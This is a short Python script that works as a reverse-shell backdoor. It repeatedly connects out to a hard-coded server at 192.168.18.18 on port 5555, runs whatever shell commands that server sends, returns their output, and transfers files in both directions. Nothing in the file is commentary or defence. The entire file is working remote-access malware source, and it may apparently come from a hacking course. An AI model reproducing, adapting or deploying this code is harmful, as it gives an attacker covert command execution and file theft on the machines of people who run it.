import socket
import time
import json
import subprocess
import os

SERVER_IP = '192.168.18.18'
SLEEP_SECONDS = 20
SERVER_PORT = 5555
CHUNK_BYTES = 1024
READ_BYTES = 'rb'
WRITE_BYTES = 'wb'


def reliable_send(data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data += sock.recv(CHUNK_BYTES).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connect():
    while True:
        time.sleep(SLEEP_SECONDS)
        try:
            sock.connect((SERVER_IP, SERVER_PORT))
            shell()
            sock.close()
            break
        except:
            connect()


def download_file(file_name):
    f = open(file_name, WRITE_BYTES)
    sock.settimeout(1)
    chunk = sock.recv(CHUNK_BYTES)
    while chunk:
        f.write(chunk)
        try:
            chunk = sock.recv(CHUNK_BYTES)
        except socket.timeout as e:
            break
    sock.settimeout(None)
    f.close()


def upload_file(file_name):
    f = open(file_name, READ_BYTES)
    sock.send(f.read())


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            reliable_send(result.decode())


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect()
